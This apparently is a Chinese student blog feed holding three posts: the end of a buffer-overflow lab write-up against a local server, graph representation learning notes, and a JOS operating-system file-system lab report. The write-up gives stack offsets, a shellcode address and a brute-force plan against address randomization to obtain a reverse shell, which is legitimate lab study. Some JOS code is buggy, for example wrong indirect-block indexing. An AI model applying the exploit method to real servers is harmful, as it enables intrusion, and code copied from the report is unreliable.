srcset="/img/loading.gif" alt="16"></p><p>我们能够知道rbp的地址是0x00007fffffffe1a0，而buffer的首地址是0x00007fffffffe140，此时相距0x60 = 96bytes</p><p>之后需要用到gdb来调试，在这里需要修改makefile，并且重新编译并且启动容器</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/17.PNG" srcset="/img/loading.gif" alt="17"></p><p>分别运行<code>gdb stack-L4，b main，r，p /x &amp;str</code>命令来获取str的地址</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/18.PNG" srcset="/img/loading.gif" alt="18"></p><p>之后我们需要找到rbp的位置来确定相对偏移量，将断点设在bof函数，然后查看rbp寄存器的值就好</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/20.PNG" srcset="/img/loading.gif" alt="20"></p><p>所以，str和rbp之间的相对的偏移量是0x430</p><p>之后结合运行时候rbp的地址是0x00007fffffffe1a0，可以计算出str的地址是0x00007fffffffe5d0，同时将shellcode存放在相对str起始位置256偏移量的地方，所以shellcode的地址就是0x00007fffffffe6d0，而return address相对于buffer的偏移量是0x68</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/21.PNG" srcset="/img/loading.gif" alt="21"></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/22.PNG" srcset="/img/loading.gif" alt="22"></p><p>成功！</p><h2 id="task-6：Experimenting-with-the-Address-Randomization"><a href="#task-6：Experimenting-with-the-Address-Randomization" class="headerlink" title="task 6：Experimenting with the Address Randomization"></a>task 6：Experimenting with the Address Randomization</h2><p>打开栈地址随机化并且发送echo hello命令</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/23.PNG" srcset="/img/loading.gif" alt="23"></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/24.PNG" srcset="/img/loading.gif" alt="24"></p><p>可以看到每次栈的栈帧指针和buffer起始位置都变化了，但是buffer分配的缓冲区大小不变。</p><p>采用暴力破解来击败随机化策略：原理是任意猜一组当前栈帧指针位置和buffer首地址，只要保证buffer size为0x70即可，然后不停给server发送badfile，由于server栈地址一直在变化，总有一次可以正好变成你猜的这组地址，然后就能获取reverse shell了。</p><p>好吧，是我脸黑</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/25.PNG" srcset="/img/loading.gif" alt="25"></p><h2 id="task-7：Experimenting-with-Other-Countermeasures"><a href="#task-7：Experimenting-with-Other-Countermeasures" class="headerlink" title="task 7：Experimenting with Other Countermeasures"></a>task 7：Experimenting with Other Countermeasures</h2><p>在makefile中把 -fno-stack-protector注释掉。然后make，并且单独运行stack-L1</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/26.PNG" srcset="/img/loading.gif" alt="26"></p><p>可以看到stack smashing detected，保护机制丢弃了这个输入</p><p>下面是使得堆栈不可执行，修改makefile文件，并重新编译运行</p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/27.PNG" srcset="/img/loading.gif" alt="27"></p><p><img src="/2021/03/16/Buffer-Overflow-Attack-server/28.PNG" srcset="/img/loading.gif" alt="28"></p><p>完成！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Buffer-Overflow-Attack-Server-Version&quot;&gt;&lt;a href=&quot;#Buffer-Overflow-Attack-Server-Version&quot; class=&quot;headerlink&quot; title=&quot;Buffer Overflow At</summary>
      
    
    
    
    
    <category term="software security" scheme="http://yoursite.com/tags/software-security/"/>
    
  </entry>
  
  <entry>
    <title>Graph Representation learning</title>
    <link href="http://yoursite.com/2021/03/03/Graph-Representation-learning/"/>
    <id>http://yoursite.com/2021/03/03/Graph-Representation-learning/</id>
    <published>2021-03-03T08:23:34.000Z</published>
    <updated>2021-03-17T08:56:50.521Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2-Background-amp-Traditional-approaches"><a href="#2-Background-amp-Traditional-approaches" class="headerlink" title="2.Background &amp; Traditional approaches"></a>2.Background &amp; Traditional approaches</h2><h3 id="2-3-Graph-Laplacians-and-Spectral-Methods-图拉普拉斯和谱图方法"><a href="#2-3-Graph-Laplacians-and-Spectral-Methods-图拉普拉斯和谱图方法" class="headerlink" title="2.3 Graph Laplacians and Spectral Methods(图拉普拉斯和谱图方法)"></a>2.3 Graph Laplacians and Spectral Methods(图拉普拉斯和谱图方法)</h3><p>邻接矩阵可以无信息损失的表示图，而具有同样的一些效果的矩阵被称为拉普拉斯矩阵，这些矩阵是由邻接矩阵通过变换得到的</p><h4 id="2-3-1-Graph-Laplacians"><a href="#2-3-1-Graph-Laplacians" class="headerlink" title="2.3.1 Graph Laplacians"></a>2.3.1 Graph Laplacians</h4><ul><li><strong>Unnormalized Laplacian非规范化的拉普拉斯式</strong></li></ul><p><img src="/2021/03/03/Graph-Representation-learning/2.3-1.PNG" srcset="/img/loading.gif" alt="2.3-1"></p><h4 id="2-3-2-Graph-Cuts-and-clustering"><a href="#2-3-2-Graph-Cuts-and-clustering" class="headerlink" title="2.3.2 Graph Cuts and clustering"></a>2.3.2 Graph Cuts and clustering</h4><p>在这一节当中会介绍使用拉普拉斯矩阵，在完全连通图中给出节点的最优聚类（optimal cluster）。</p><p><strong>Graph cuts</strong></p><p>首先，我们先需要找的用来衡量分割好坏的量，称之为<code>cut value</code>，而其值的定义如下：</p><p><img src="/2021/03/03/Graph-Representation-learning/2.3-2.PNG" srcset="/img/loading.gif" alt="2.3-2"></p><p>换句话说，就是<strong>有的多少条边越过了我们所划分的不同子集的边界</strong>，而所谓的最优聚类就算是找到cut value最小的划分方式</p><p><strong>缺点：倾向于把图划分成独立的点（稍微有一些不理解！！！）</strong></p><p>改进方法：不仅仅是寻找最小化切割的方式，并且要使得分区是较大的，引入<code>ratio cut</code>：</p><p><img src="/2021/03/03/Graph-Representation-learning/2.3-3.PNG" srcset="/img/loading.gif" alt="2.3-3"></p><p>此时，如果是较小的分区，那么分母就会是比较小的，进而ratio cut变大</p><p>同时还有一种解决方法——<code>Ncut</code>：</p><p><img src="/2021/03/03/Graph-Representation-learning/2.3-4.PNG" srcset="/img/loading.gif" alt="2.3-4"></p><p><strong>使用拉普拉斯谱最小化RatioCut</strong></p><p>目标是通过拉普拉斯谱来找到最小的ratiocut</p><blockquote><p>最小化目标定义为，<br><img src="/2021/03/03/Graph-Representation-learning/2.3-5.PNG" srcset="/img/loading.gif" alt="2.3-5"></p><p>为了解决NP难问题，将a的条件放宽到，满足上述2个条件的实值向量即可。<br>根据瑞利-里兹定理，这个优化问题的解是由L的第二小的特征值对应的特征向量，因此，我们可以通过设置a为第二小的特征向量，来逼近RatioCut的最小值。<br>总而言之，拉普拉斯矩阵的第二小的特征向量是离散向量的连续近似，它给出了一个最优的聚类分配。<br><img src="/2021/03/03/Graph-Representation-learning/2.3-6.PNG" srcset="/img/loading.gif" alt="2.3-6"></p></blockquote><h4 id="2-3-3-Generalized-spectral-clustering"><a href="#2-3-3-Generalized-spectral-clustering" class="headerlink" title="2.3.3 Generalized spectral clustering"></a>2.3.3 Generalized spectral clustering</h4><p>上一节，我们找到了一个将图分成两个簇的最优划分。那么，我们也可以将这种方法推广到K个簇的最优划分问题上。</p><p>这种一般方法的步骤如下：<br><img src="/2021/03/03/Graph-Representation-learning/2.3-8.PNG" srcset="/img/loading.gif" alt="2.3-8"></p><p>4、使用K均值聚类方法来聚合，从而在最优划分的条件下，将图划分成K簇。</p><h3 id="2-4-Towards-Learned-Representations"><a href="#2-4-Towards-Learned-Representations" class="headerlink" title="2.4 Towards Learned Representations"></a>2.4 Towards Learned Representations</h3><h1 id="Part-Ⅰ：Node-Embedding"><a href="#Part-Ⅰ：Node-Embedding" class="headerlink" title="Part Ⅰ：Node Embedding"></a>Part Ⅰ：Node Embedding</h1><h2 id="3-Neighborhood-Reconstruction-Methods"><a href="#3-Neighborhood-Reconstruction-Methods" class="headerlink" title="3.Neighborhood Reconstruction Methods"></a>3.Neighborhood Reconstruction Methods</h2><p>什么是node embedding and why we need？</p><p>有监督的机器学习都要经历以下几个步骤：首先在原始数据上进行特征工程（因为计算机无法直接识别一个抽象的东西，例如graph或者图片等，需要用计算机能够理解的方式表示出来），得到结构化的数据，接着确定机器学习算法，最终训练得到模型。在这个过程中，特征工程是十分耗时费力的。因此我们更喜欢能够自动获取这些特征的方式（如深度学习）。</p><p>而node embedding就是将计算机难以理解的raw data转变为可以理解的structure data，我们通过d维空间上的向量来表示一个节点，d是用来衡量节点信息的，d越大，往往代表节点所包含的信息越大，同时还要求embedding的过程是可逆的，即我们还能从所有向量中推测出原来的图的形式，同时为了评判这个过程的好坏，引入了衡量/相似函数similarity以及损失函数loss</p><p>下面是一个案例，将左边的图结构的节点用一个二维向量来表示（当然在实际项目中，embedding向量通常会有几十甚至几百个维度，这里采用二维向量只是为了方便可视化）。可以看到，在右边的图上，比较接近的点在网络中的关系也比较紧密。</p><p>但是，传统的深度学习框架很难解决Network Embedding，主要原因有以下几点：</p><p>CNN用于固定大小的图像/网格，即像素点的拓扑结构使单一的、固定的。</p><p>RNNs或word2vec用于文本/序列，即节点的次序是固定的。</p><p>而网络（Networks）的结构要复杂的多得多！网络拥有更加复杂的拓扑结构，且节点的顺序并不是固定的。更有甚者，网络是动态变化的。<br>因此，我们接下来讨论网络中的embedding nodes。</p><p>在第三章中，我们关心的是图的结构信息，所以忽略掉了所有的节点特征以及其他信息，同时我们的目标是在经过embedding之后，d维空间上两个向量的相似性和在图上两个节点的相似性基本上是很像的，在这里，我们首先要定义好什么是图上节点的相似性，之后才能构造编码函数并衡量向量空间上是否相似</p><p>第28页</p><p>假设左边就是一个我们需要输入的图结构，希望通过一个两层的神经网络来学习我们target node的一个新的表示，首先找到A的邻居B,C,D，之后再找的话就是找BCD的邻居，找到之后将相应的信息进行聚合，聚合之后会得到一层神经网络的结果，之后再次进行聚合，会得到A的经过两层神经网络的消息传递之后的结果</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;2-Background-amp-Traditional-approaches&quot;&gt;&lt;a href=&quot;#2-Background-amp-Traditional-approaches&quot; class=&quot;headerlink&quot; title=&quot;2.Background &amp;</summary>
      
    
    
    
    
    <category term="Graph representation learning" scheme="http://yoursite.com/tags/Graph-representation-learning/"/>
    
  </entry>
  
  <entry>
    <title>操作系统lab6实验报告</title>
    <link href="http://yoursite.com/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://yoursite.com/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</id>
    <published>2021-01-05T02:38:37.000Z</published>
    <updated>2021-01-05T04:42:41.764Z</updated>
    
    <content type="html"><![CDATA[<p align="right">姓名：贾昊龙</p><p align="right">学号：18307130049</p><h1 id="PartⅠ：运行结果"><a href="#PartⅠ：运行结果" class="headerlink" title="PartⅠ：运行结果"></a>PartⅠ：运行结果</h1><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/1.PNG" srcset="/img/loading.gif" alt="1"></p><h1 id="Part-Ⅱ：问题回答"><a href="#Part-Ⅱ：问题回答" class="headerlink" title="Part Ⅱ：问题回答"></a>Part Ⅱ：问题回答</h1><ul><li><strong>请回答Exercise 1后的Question 1，Do you have to do anything else to ensure that this I/O privilege setting is saved and restored properly when you subsequently switch from one environment to another? Why?</strong></li></ul><p>不需要，当进程陷入中断后，所有寄存器信息会被保存到进程的 env_tf 中，在之前的lab当中已经实现过了</p><ul><li><strong>详细描述JOS 中文件存储的结构、打开文件的过程以及往文件中写入数据的过程。</strong></li></ul><p>在JOS中，文件系统是一个运行在userspace的进程，而其他进程通过类似Clinet-Server的方式来与文件系统进程进行进程间通信，从而实现文件操作。</p><p>存储结构定义在<code>fs.h</code>当中</p><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/3.png" srcset="/img/loading.gif" alt="3"></p><p>而文件读写过程可以参考问题5的回答</p><ul><li><strong>对于此JOS，一个磁盘有多少个扇区？</strong></li></ul><p>JOS的磁盘总大小为定义在fs.h中的 DISKSIZE ,值为3GB；而每个扇区的大小为 SECTSIZE , 值为 512B。因此JOS总共有：3 * 2^21个扇区</p><ul><li><strong>请详细阐述，JOS中superblock的概念，以及superblock的布局和结构。</strong></li></ul><p>超级块指的是文件系统保存文件系统元数据的数据块</p><p>JOS中文件系统的第1块（块号为0）是磁盘块，用来用作保存bootloader和分区表，而第2块（块号为1）就是超级块，用来保存文件系统元信息的，布局如下：</p><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/4.PNG" srcset="/img/loading.gif" alt="4"></p><ul><li>以open文件为例，阐述regular环境访问磁盘的流程</li></ul><p>以磁盘读为例，当一个进程在发起一次磁盘读取请求的时候，首先会调用JOS提供的库函数 <code>read()</code>，而 <code>read()</code> 函数会调用 <code>devfile_read()</code> 函数，这个函数是进程端的磁盘读接口，它会继续将用户的读取请求递交给 <code>fsipc()</code> 函数，之后通过进程间通信IPC机制，将读取请求发送给接收端的文件系统进程。</p><p>文件系统进程<code>serve</code>会不断的进行 <code>ipc_recv()</code>来 检查是否有进程发起读写请求。在接收到进程读文件的 IPC信息后，serve会将这个信息发送给 <code>serve_read()</code> ，最后调用<code>file_read()</code> 函数完成真正的文件读取过程，而之前的过程都是在进行信息传递。</p><ul><li><strong>画出对应的流程图</strong></li></ul><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/7.PNG" srcset="/img/loading.gif" alt="7"></p><ul><li><strong>5-c fd page是什么时候设置好的？</strong></li></ul><p>fd page在JOS中的作用类似于文件描述符，它是OpenFile结构体中的一项，结构如下：</p><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/5.PNG" srcset="/img/loading.gif" alt="5"></p><p>当文件系统进程接收到文件读写请求时，会调用<code>server_open()</code>函数打开文件，并写入fd page信息。</p><p><img src="/2021/01/05/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9Flab6%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/6.PNG" srcset="/img/loading.gif" alt="6"></p><h1 id="Part-A：the-file-system"><a href="#Part-A：the-file-system" class="headerlink" title="Part A：the file system"></a>Part A：the file system</h1><h4 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h4><blockquote><p><code>i386_init</code> identifies the file system environment by passing the type <code>ENV_TYPE_FS</code> to your environment creation function, <code>env_create</code>. Modify <code>env_create</code> in <code>env.c</code>, so that it gives the file system environment I/O privilege, but never gives that privilege to any other environment.</p><p>Make sure you can start the file environment without causing a General Protection fault. You should pass the “fs i/o” test in make grade.</p></blockquote><p><strong><code>env_create()</code></strong></p><p>只需要在文件系统进程创建的时候给予访问文件的权限即可（设置eflags寄存器的IOPL标志位）</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>env_create(<span class="hljs-keyword">uint8_t</span> *binary, <span class="hljs-keyword">enum</span> EnvType type)&#123;<span class="hljs-comment">// LAB 3: Your code here.</span><span class="hljs-comment">// If this is the file server (type == ENV_TYPE_FS) give it I/O privileges.</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">e</span>;</span><span class="hljs-keyword">int</span> r;<span class="hljs-keyword">if</span> ((r = env_alloc(&amp;e, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>)) &#123;panic(<span class="hljs-string">"create env failed\n"</span>);&#125;<span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-keyword">if</span> (type == ENV_TYPE_FS)&#123;e-&gt;env_tf.tf_eflags = e-&gt;env_tf.tf_eflags | FL_IOPL_MASK;&#125;load_icode(e, binary);e-&gt;env_type = type;&#125;</code></pre><h4 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise 2"></a>Exercise 2</h4><blockquote><p>IUse <code>free_block</code> as a model to implement <code>alloc_block</code> in <code>fs/fs.c</code>, which should find a free disk block in the bitmap, mark it used, and return the number of that block. When you allocate a block, you should immediately flush the changed bitmap block to disk with <code>flush_block</code>, to help file system consistency.</p><p>Use make grade to test your code. Your code should now pass “alloc_block”.mplement the <code>bc_pgfault</code> and <code>flush_block</code> functions in <code>fs/bc.c</code>. <code>bc_pgfault</code> is a page fault handler, just like the one your wrote in the previous lab for copy-on-write fork, except that its job is to load pages in from the disk in response to a page fault. When writing this, keep in mind that (1) <code>addr</code> may not be aligned to a block boundary and (2) <code>ide_read</code> operates in sectors, not blocks.</p><p>The <code>flush_block</code> function should write a block out to disk <em>if necessary</em>. <code>flush_block</code> shouldn’t do anything if the block isn’t even in the block cache (that is, the page isn’t mapped) or if it’s not dirty. We will use the VM hardware to keep track of whether a disk block has been modified since it was last read from or written to disk. To see whether a block needs writing, we can just look to see if the <code>PTE_D</code> “dirty” bit is set in the <code>uvpt</code> entry. (The <code>PTE_D</code> bit is set by the processor in response to a write to that page; see 5.2.4.3 in <a href="http://pdos.csail.mit.edu/6.828/2011/readings/i386/s05_02.htm" target="_blank" rel="noopener">chapter 5</a> of the 386 reference manual.) After writing the block to disk, <code>flush_block</code> should clear the <code>PTE_D</code> bit using <code>sys_page_map</code>.</p><p>Use make grade to test your code. Your code should pass “check_bc”, “check_super”, and “check_bitmap”</p></blockquote><p><strong><code>bc_pgfault</code></strong></p><p>该函数的作用是文件系统进程的缺页处理，将磁盘块数据读取到相应的内存位置</p><pre><code class="hljs c"><span class="hljs-comment">// LAB 5: you code here:</span>addr = (<span class="hljs-keyword">void</span> *)ROUNDDOWN(addr, BLKSIZE);<span class="hljs-keyword">if</span>((r = SYS_page_alloc(<span class="hljs-number">0</span>, addr, PTE_U | PTE_W | PTE_P)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"in bc_pgfault, sys_page_alloc: %e"</span>, r);<span class="hljs-keyword">if</span> ((r = (ide_read(blockno*BLKSECTS, addr, BLKSECTS))) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"in bc_pgfault, sys_page_alloc: %e"</span>, r);<span class="hljs-comment">// Clear the dirty bit for the disk block page since we just read the</span><span class="hljs-comment">// block from disk</span></code></pre><p> <strong><code>flush_block</code></strong> </p><p>这个函数将缓存的block写回到磁盘中，如果数据块没有被写过，则不需要做任何事。通过 PTE_D 标志位可以判断数据块是否被写入过。</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>flush_block(<span class="hljs-keyword">void</span> *addr)&#123;<span class="hljs-keyword">uint32_t</span> blockno = ((<span class="hljs-keyword">uint32_t</span>)addr - DISKMAP) / BLKSIZE;<span class="hljs-keyword">int</span> r;<span class="hljs-keyword">if</span> (addr &lt; (<span class="hljs-keyword">void</span>*)DISKMAP || addr &gt;= (<span class="hljs-keyword">void</span>*)(DISKMAP + DISKSIZE))panic(<span class="hljs-string">"flush_block of bad va %08x"</span>, addr);<span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-comment">// panic("flush_block not implemented");</span>addr = (<span class="hljs-keyword">void</span>*)ROUNDDOWN(addr, BLKSIZE);<span class="hljs-keyword">if</span>(!va_is_mapped(addr) || !va_is_dirty(addr)) <span class="hljs-keyword">return</span>;<span class="hljs-keyword">if</span>((r = ide_write(blockno*BLKSECTS, addr, BLKSECTS)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"in flush_block, ide_write: %e"</span>, r);<span class="hljs-keyword">if</span> ((r = sys_page_map(<span class="hljs-number">0</span>, addr, <span class="hljs-number">0</span>, addr, uvpt[PGNUM(addr)] &amp; PTE_SYSCALL)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"in flush_block, sys_page_map: %e"</span>, r);&#125;</code></pre><h4 id="Exercise-3"><a href="#Exercise-3" class="headerlink" title="Exercise 3"></a>Exercise 3</h4><blockquote><p>Use <code>free_block</code> as a model to implement <code>alloc_block</code> in <code>fs/fs.c</code>, which should find a free disk block in the bitmap, mark it used, and return the number of that block. When you allocate a block, you should immediately flush the changed bitmap block to disk with <code>flush_block</code>, to help file system consistency.</p><p>Use make grade to test your code. Your code should now pass “alloc_block”.</p></blockquote><p><strong><code>alloc_block</code></strong></p><p>函数的作用是从 bitmap 中找到一个空的数据块，并给调用函数的进程分配它。</p><pre><code class="hljs c"><span class="hljs-keyword">int</span>alloc_block(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-comment">// The bitmap consists of one or more blocks.  A single bitmap block</span><span class="hljs-comment">// contains the in-use bits for BLKBITSIZE blocks.  There are</span><span class="hljs-comment">// super-&gt;s_nblocks blocks in the disk altogether.</span><span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint32_t</span> i = <span class="hljs-number">2</span> ; i &lt; super-&gt;s_nblocks ; i++)&#123;<span class="hljs-keyword">if</span> (block_is_free(i))&#123;bitmap[i&gt;&gt;<span class="hljs-number">5</span>] &amp;= ~(<span class="hljs-number">1</span> &lt;&lt; (i % <span class="hljs-number">32</span>));flush_block(diskaddr(i));<span class="hljs-keyword">return</span> i;&#125;&#125;<span class="hljs-comment">// panic("alloc_block not implemented");</span><span class="hljs-keyword">return</span> -E_NO_DISK;&#125;</code></pre><h4 id="Exercise-4"><a href="#Exercise-4" class="headerlink" title="Exercise 4"></a>Exercise 4</h4><blockquote><p>Implement <code>file_block_walk</code> and <code>file_get_block</code>. <code>file_block_walk</code> maps from a block offset within a file to the pointer for that block in the <code>struct File</code> or the indirect block, very much like what <code>pgdir_walk</code> did for page tables. <code>file_get_block</code> goes one step further and maps to the actual disk block, allocating a new one if necessary.</p><p>Use make grade to test your code. Your code should pass “file_open”, “file_get_block”, and “file_flush/file_truncated/file rewrite”, and “testfile”.</p></blockquote><p><strong><code>file_block_walk</code></strong></p><p>这个函数的功能是找到文件 f 中第 filebno 号数据块的数据块号slot并保存到 ppdiskbno 中。</p><pre><code class="hljs c"><span class="hljs-comment">// Hint: Don't forget to clear any block you allocate.</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>file_block_walk(struct <span class="hljs-built_in">File</span> *f, <span class="hljs-keyword">uint32_t</span> filebno, <span class="hljs-keyword">uint32_t</span> **ppdiskbno, <span class="hljs-keyword">bool</span> alloc)&#123;    <span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-keyword">if</span>(filebno&gt;= NDIRECT + NINDIRECT) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">if</span>(filebno&lt;NDIRECT)&#123;*ppdiskbno = &amp;(f-&gt;f_direct[filebno]);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (f-&gt;f_indirect == <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">if</span>(alloc) &#123;<span class="hljs-keyword">int</span> blockno = alloc_block();<span class="hljs-keyword">if</span>(blockno &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> -E_NO_DISK;<span class="hljs-built_in">memset</span>(diskaddr(blockno), <span class="hljs-number">0</span>, BLKSIZE);f-&gt;f_indirect = blockno;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> -E_NOT_FOUND;&#125;<span class="hljs-keyword">uint32_t</span> * addr = (<span class="hljs-keyword">uint32_t</span>*)diskaddr(f-&gt;f_indirect);*ppdiskbno = &amp;addr[filebno];<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-comment">// panic("file_block_walk not implemented");</span>&#125;</code></pre><p><strong><code>file_get_block</code></strong></p><p>这个函数的功能是查找文件 f 第 filebno 个数据块对应的虚拟地址 addr ，并将其保存到给定的地 址 blk 处。根据提示实现即可</p><pre><code class="hljs c"><span class="hljs-comment">// Hint: Use file_block_walk and alloc_block.</span><span class="hljs-keyword">int</span>file_get_block(struct <span class="hljs-built_in">File</span> *f, <span class="hljs-keyword">uint32_t</span> filebno, <span class="hljs-keyword">char</span> **blk)&#123;    <span class="hljs-comment">// LAB 5: Your code here.</span>    <span class="hljs-comment">// panic("file_get_block not implemented");</span><span class="hljs-keyword">uint32_t</span> *ppdiskbno;<span class="hljs-keyword">int</span> r = file_block_walk(f,filebno, &amp;ppdiskbno,<span class="hljs-number">1</span>);<span class="hljs-keyword">if</span>(r &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;<span class="hljs-keyword">if</span>((*ppdiskbno) == <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">if</span>((*ppdiskbno = alloc_block()) &lt; <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">return</span> -E_NO_DISK;&#125;&#125;*blk = diskaddr(*ppdiskbno);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h4 id="Exercise-5"><a href="#Exercise-5" class="headerlink" title="Exercise 5"></a>Exercise 5</h4><blockquote><p>Implement <code>serve_read</code> in <code>fs/serv.c</code>.</p><p><code>serve_read</code>‘s heavy lifting will be done by the already-implemented <code>file_read</code> in <code>fs/fs.c</code> (which, in turn, is just a bunch of calls to <code>file_get_block</code>). <code>serve_read</code> just has to provide the RPC interface for file reading. Look at the comments and code in <code>serve_set_size</code> to get a general idea of how the server functions should be structured.</p><p>Use make grade to test your code. Your code should pass “serve_open/file_stat/file_close” and “file_read” for a score of 70/150.</p></blockquote><p><strong><code>serve_read</code></strong></p><p>这个函数是文件系统进程的服务端接口，调用 <code>file_read()</code> 来实现真正的文件读取</p><pre><code class="hljs c"><span class="hljs-comment">// Read at most ipc-&gt;read.req_n bytes from the current seek position</span><span class="hljs-comment">// in ipc-&gt;read.req_fileid.  Return the bytes read from the file to</span><span class="hljs-comment">// the caller in ipc-&gt;readRet, then update the seek position.  Returns</span><span class="hljs-comment">// the number of bytes successfully read, or &lt; 0 on error.</span><span class="hljs-keyword">int</span>serve_read(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">union</span> Fsipc *ipc)&#123;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Fsreq_read</span> *<span class="hljs-title">req</span> = &amp;<span class="hljs-title">ipc</span>-&gt;<span class="hljs-title">read</span>;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Fsret_read</span> *<span class="hljs-title">ret</span> = &amp;<span class="hljs-title">ipc</span>-&gt;<span class="hljs-title">readRet</span>;</span><span class="hljs-keyword">if</span> (debug)cprintf(<span class="hljs-string">"serve_read %08x %08x %08x\n"</span>, envid, req-&gt;req_fileid, req-&gt;req_n);<span class="hljs-comment">// Lab 5: Your code here:</span><span class="hljs-keyword">int</span> r;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">OpenFile</span> *<span class="hljs-title">o</span>;</span><span class="hljs-keyword">if</span> ((r = openfile_lookup(envid, req-&gt;req_fileid, &amp;o)) &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;r = file_read(o-&gt;o_file, ret-&gt;ret_buf, req-&gt;req_n, o-&gt;o_fd-&gt;fd_offset);<span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;o-&gt;o_fd-&gt;fd_offset += r;<span class="hljs-keyword">return</span> r;&#125;</code></pre><h4 id="Exercise-6"><a href="#Exercise-6" class="headerlink" title="Exercise 6"></a>Exercise 6</h4><blockquote><p>Implement <code>serve_write</code> in <code>fs/serv.c</code> and <code>devfile_write</code> in <code>lib/file.c</code>.</p><p>Use make grade to test your code. Your code should pass “file_write”, “file_read after file_write”, “open”, and “large file” for a score of 90/150.</p></blockquote><p><strong><code>serve_write</code></strong></p><p>与之前的 serve_read() 实现方法基本一样</p><pre><code class="hljs c"><span class="hljs-comment">// Write req-&gt;req_n bytes from req-&gt;req_buf to req_fileid, starting at</span><span class="hljs-comment">// the current seek position, and update the seek position</span><span class="hljs-comment">// accordingly.  Extend the file if necessary.  Returns the number of</span><span class="hljs-comment">// bytes written, or &lt; 0 on error.</span><span class="hljs-keyword">int</span>serve_write(<span class="hljs-keyword">envid_t</span> envid, struct Fsreq_write *req)&#123;<span class="hljs-keyword">if</span> (debug)cprintf(<span class="hljs-string">"serve_write %08x %08x %08x\n"</span>, envid, req-&gt;req_fileid, req-&gt;req_n);<span class="hljs-comment">// LAB 5: Your code here.</span><span class="hljs-comment">// panic("serve_write not implemented");</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">OpenFile</span>* <span class="hljs-title">o</span> = <span class="hljs-title">NULL</span>;</span><span class="hljs-keyword">int</span> r = openfile_lookup(envid, req-&gt;req_fileid, &amp;o);<span class="hljs-keyword">if</span>(r &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> r;r = file_write(o-&gt;o_file, req-&gt;req_buf, req-&gt;req_n, o-&gt;o_fd-&gt;fd_offset);<span class="hljs-keyword">if</span>(r &gt; <span class="hljs-number">0</span>) o-&gt;o_fd-&gt;fd_offset += r;<span class="hljs-keyword">return</span> r;&#125;</code></pre><p><strong><code>devfile_write</code></strong></p><p>是客户端进程函数，通过调用 fsipc() 将传入的参数发送给文件系统进程。</p><pre><code class="hljs c"><span class="hljs-comment">// Write at most 'n' bytes from 'buf' to 'fd' at 